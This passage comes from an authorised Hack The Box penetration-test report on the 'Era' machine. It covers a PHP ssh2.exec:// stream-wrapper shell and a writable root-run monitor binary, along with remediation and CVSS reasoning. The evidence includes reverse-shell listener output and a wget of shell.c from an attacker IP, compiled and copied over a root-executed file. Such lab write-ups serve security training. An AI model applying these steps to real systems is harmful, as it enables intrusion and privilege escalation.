listening on [any] 4445 ...
connect to [10.10.15.197] from (UNKNOWN) [10.129.237.233] ...
eric@era:~$
```

This confirms the operating-system access achieved in the lab. The preserved request does not, by itself, show which earlier action satisfied the admin-only session check.

#### Reproduction Summary

1. Recover the source code and inspect `download.php` for the `show` and `format` parameters.
2. Notice that the `format` parameter accepts a wrapper-like string containing `://` and is used in `fopen()`.
3. Verify whether the SSH2 extension is available. In my assessment, `ssh2.so` was visible during FTP enumeration.
4. With a session allowed to use the preview function and valid credentials recovered during the lab, submit the recorded wrapper-based request.
5. Observe the resulting connection to the controlled listener and confirm the shell's user as `eric`.

#### CVSS Rationale

`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N` — The command execution was triggered remotely through the web application with no further user interaction. Confidentiality is assessed as high because obtaining a shell allowed access to local files and further enumeration. Integrity is low in this recorded initial foothold, and availability was not shown to be affected.

**Scoring limitation:** The vulnerable code checks for an administrative session and the execution request also used recovered SSH credentials. The 7.1 score came from the combined assessment path. It should not be treated as the final standalone score for this preview function: the code requires an administrator session and the tested request also supplied recovered SSH credentials. If this were a live client finding, I would verify the exact privileges and prerequisites before finalising the CVSS score.

#### Impact

An attacker who can reach the preview feature and supply a working execution wrapper could move from interacting with the website to running commands on the underlying Linux system. In this assessment, I obtained a shell as `eric`, which allowed me to inspect internal processes, permissions and other files that were not accessible through the public web interface.

This was a significant step in the attack chain because it turned exposed web application functionality into host-level access.

#### Remediation

Developers should not let users provide unrestricted wrapper paths to `fopen()`. The file-preview function should accept only specific file formats that the application actually needs, and any file path should be resolved to an approved directory before being opened.

The application should block remote and executable stream wrappers such as `ssh2.exec://` from user-controlled input. Unnecessary PHP extensions should be disabled, and the preview function should be reviewed to ensure that its administrative access check cannot be bypassed. Credentials recovered from exposed backups should be reset, and sensitive backups should no longer be available through file downloads.

---

### F05 - Privilege Escalation via Privileged Scheduled Task

**Severity:** High (provisional)  
**CVSS:** 7.1  
**Vector:** `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`

#### Vulnerability Classification/Scope

| Field | Value |
| --- | --- |
| Vulnerability Title | Weak Permissions on Executable Used by Root Scheduled Task |
| Vulnerability Class | Insecure File Permissions — Local Privilege Escalation Risk |
| CWE | [CWE-732 — Incorrect Permission Assignment for Critical Resource](https://cwe.mitre.org/data/definitions/732.html) |
| CVE | N/A — HTB lab finding |
| OWASP Mapping | Not primarily a web application vulnerability — local privilege boundary |
| Severity | High (provisional) |
| CVSS v3.1 Base Score | 7.1 (potential impact if execution check can be passed) |
| CVSS v3.1 Vector | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
| Affected Asset | Era Linux host |
| Affected Component / Endpoint | `/root/initiate_monitoring.sh` and `/opt/AV/periodic-checks/monitor` |
| Affected Parameter / Resource | Group-writable monitoring executable and its directory |
| Authentication Required | Local access as a user with permission to modify the executable |
| Security Boundary Crossed | Low-privileged local user to root-owned scheduled execution, if validation is defeated |
| Finding Status | Unsafe permission confirmed; signature bypass method not preserved |

#### Description

Once I obtained a shell as `eric`, I started checking the processes running on the machine to see whether any of them were being executed with higher privileges. The process monitoring output showed that root was repeatedly running `/root/initiate_monitoring.sh`, which used the monitoring executable at `/opt/AV/periodic-checks/monitor`.

Checking the permissions with `ls -la` showed that the `monitor` file was owned by `root`, belonged to the `devs` group and was **group-writable**. The directory was also writable by that group. I tested whether the current shell could replace the binary, and the `cp` command succeeded.

However, the monitoring process also checked the executable's signature. After I replaced `monitor` with my compiled program, `status.log` showed an error saying the executable was not signed, and the scheduled task skipped it. **This means the first attempt did not achieve privilege escalation.**

A later screenshot shows a root shell, but the commands that got past the signing requirement are missing from the supplied notes. The file permissions are still a valid security concern; I cannot claim the failed binary replacement alone produced the root shell.

#### Evidence / PoC

I observed root-owned scheduled execution:

```text
UID=0 | bash -c /root/initiate_monitoring.sh
UID=0 | /opt/AV/periodic-checks/monitor
UID=0 | openssl asn1parse -inform DER -in text_sig_section.bin
```

I then checked the directory permissions:

```text
drwxrwxr-- 2 root devs  4096 ... .
-rwxrw---- 1 root devs 16544 ... monitor
-rw-rw---- 1 root devs   307 ... status.log
```

The replacement attempt was recorded as:

```bash
wget http://10.10.15.197:85/shell.c
gcc shell.c -o shell
cp shell monitor
cat status.log
```

The application's monitoring log reported:

```text
objcopy: /opt/AV/periodic-checks/monitor: can't dump section '.text_sig'
[ERROR] Executable not signed. Tampering attempt detected. Skipping.
```

A later terminal screenshot shows root-level access, with the HTB proof value removed from the public image:

![E09 — Later root-level shell, proof redacted](./evidence/Pasted%20image%2020261020184653.png)

*Figure E09 — Root access was observed later, but the missing intermediate steps cannot be inferred from this screenshot.*

#### Reproduction Summary

1. Obtain an authorised low-privileged shell on the lab target and investigate processes running as root.
2. Identify `/root/initiate_monitoring.sh` and the executable it runs.
3. Inspect permissions on `/opt/AV/periodic-checks/` and `monitor` using `ls -la`.
4. Confirm whether the current user has permission to modify the executable. The recorded `cp` operation succeeded.
5. Review `status.log` after replacing the executable. In the captured attempt, the scheduled task rejected the replacement because its signature was missing.

**Reproduction limitation:** The specific step that eventually led to the root shell was not captured, so a complete, independently repeatable root-level exploit cannot be provided from the supplied notes.

#### CVSS Rationale

`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` — The weakness is local because an attacker must already have a shell or equivalent access. The compromised user session could modify a binary associated with a root-owned scheduled task. If an attacker can also pass the signature check, this could lead to access to root-owned files and the ability to modify the system with root privileges.

The recorded first attempt was blocked by the signature validation, so the high-severity assessment describes the **potential impact**, not a fully documented exploit path. Availability was not shown to be affected. The score should be revisited if the signature bypass steps are recovered or if a later retest shows the check cannot be bypassed.

#### Impact

An attacker with limited local permissions should not be able to modify a program that root is expected to execute. If the integrity check can be bypassed, the attacker could cause privileged code to run and gain control over the machine.

The key observation here is that the executable and directory permissions exposed a path for tampering, even though a separate signature validation initially prevented execution of the modified binary.

#### Remediation

The monitoring executable and its parent directory should be writable only by a trusted administrator, not by a general development group. A suitable approach would be to keep ownership with `root`, remove group write permission and ensure that the entire executable path cannot be replaced by a lower-privileged account.

The signing check should also be retained and reviewed to make sure that it validates the entire executable using a protected verification key and fails safely when the signature is missing or invalid. Finally, the scheduled task should run with the minimum privileges needed, and unauthorised changes to monitored executables should generate alerts.

---

## 4. Overall Impact and Remediation Priorities

The most important part of this assessment was seeing how several issues could support each other. Username enumeration helped identify accounts worth testing. Weak account-recovery controls provided a possible account-takeover route. The file download issue exposed a backup containing credentials and application code. Those recovered credentials were then used alongside the unsafe PHP wrapper handling to obtain a local shell.

If I were prioritising fixes for a real environment, I would start with the account-recovery authorisation checks and unauthorised file downloads, because those weaknesses expose users and sensitive data remotely. I would then remove the unsafe wrapper behaviour and restrict the permissions on the root-run monitoring executable. Credentials recovered from the backup should be changed and any exposed signing material reviewed for replacement.

## 5. Conclusion

This HTB machine gave me practical experience with service enumeration, authentication testing, IDOR, reviewing PHP source code, working with an SQLite backup and investigating Linux scheduled tasks. It also demonstrated why a penetration test should follow the evidence: a scan response, an accessible archive and a privileged process each tell part of the story, but they do not always prove the full exploit on their own.

The clearest confirmed host-level result in my notes is the `eric` shell obtained through the PHP stream-wrapper request. Root access was also observed later, but the signature-check bypass step was not preserved. I have separated those facts to keep the report useful as a technical walkthrough without claiming more than the evidence supports.

**Public report note:** This is an authorised Hack The Box practice assessment prepared as part of my CWES and penetration-testing portfolio. The evidence screenshots in this package have been redacted where they showed HTB proof values or sensitive session information. This report does not include reusable passwords, private keys or raw proof values.
